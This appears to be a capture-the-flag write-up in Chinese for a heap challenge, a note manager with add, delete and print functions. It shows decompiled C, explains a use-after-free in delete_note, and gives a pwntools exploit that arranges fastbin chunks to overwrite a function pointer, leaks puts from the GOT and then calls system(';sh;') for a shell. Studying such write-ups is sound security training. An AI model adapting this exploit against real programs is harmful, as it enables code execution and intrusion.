### source code 
```c=
void __noreturn main()
{
  int v0; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      read(0, buf, 4u);
      v0 = atoi(buf);
      if ( v0 != 2 )
        break;
      delete_note();
    }
    if ( v0 > 2 )
    {
      if ( v0 == 3 )
      {
        print_note();
      }
      else
      {
        if ( v0 == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v0 != 1 )
        goto LABEL_13;
      add_note();
    }
  }
}

unsigned int add_note()
{
  note *v0; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&ptr + i) )
      {
        *(&ptr + i) = (note *)malloc(8u);
        if ( !*(&ptr + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        (*(&ptr + i))->func = puts_note;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        v0 = *(&ptr + i);
        v0->data = (char *)malloc(size);
        if ( !(*(&ptr + i))->data )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, (*(&ptr + i))->data, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}

unsigned int delete_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
  {
    free(*((void **)*(&ptr + v1) + 1));
    free(*(&ptr + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}

unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
    ((void (__cdecl *)(_DWORD))(*(&ptr + v1))->func)(*(&ptr + v1));
  return __readgsdword(0x14u) ^ v3;
}
```

就是一個日記管理器, 有 add, delete, print

### **有 canary 有開 NX 沒有 FULL RELRO 沒有 FMT exploit**

1. heap 題, 先看有沒有 UAF -> 在 delete_note 可以看到有 UAF
2. note 的架構
    ```c=
    struct note // malloc(8)
    {
        void *func = puts_note(data);
        char *data; // malloc(size), size 自己決定
    }
    ```
    有了以上兩點就可以使用 UAF 攻擊

### solution

1. 須考慮放進 fastbin 裡的順序, fastbin 是 LIFO
2. delete free 的順序為先 free note 裡的 data 再 free note 本身
3. 先 leak 出 libc_base
    ```py=
    add_note(0x8,b'A'*0x7)
    success('add note[0]') # 1

    add_note(0x8,b'B'*0x7)
    success('add note[1]') # 3

    pause()

    delete_note(0)
    success('delete note[0]')

    delete_note(1)
    success('delete note[1]')

    # 3 -> 4 -> 1 -> 2

    add_note(0x10, b'C'*15)
    success('add note[2]') # 3

    # 4 -> 1 -> 2

    add_note(0x8, p32(inside_puts) + p32(puts_got))
    success('add note[3]') # 1

    # 2

    print_note(0)
    puts = u32(p.recv(4))
    success('leaked')
    print(f"puts = {hex(puts)}")

    system = puts - libc.sym['puts'] + libc.sym['system']
    ```
4. code 中的 1234 代表 GDB x/wx 中的行數, 因方便觀察, 示意圖如下:
5. 
    <img width="977" height="161" alt="image" src="https://github.com/user-attachments/assets/70bf2ea7-2764-485a-b2f4-639f4f4be586" />

    第 1 跟 3 是準備要覆寫的地方, 因最多只能 add 5 個 note, 所以需要搭配 fastbin 裡的情況排列組合且搭配自製 size 弄出 -> 寫 data 的地方剛好是前面 free 掉的 note 的 puts_note 的地方, 這樣就可以呼叫 puts(puts_got)
6. code 中 # 後面為 size = 0x8 的 fastbin 裡面的情況
7. 有 system address 後就可以覆寫 puts_note 跟後面的 data address 進行 system(';sh;')
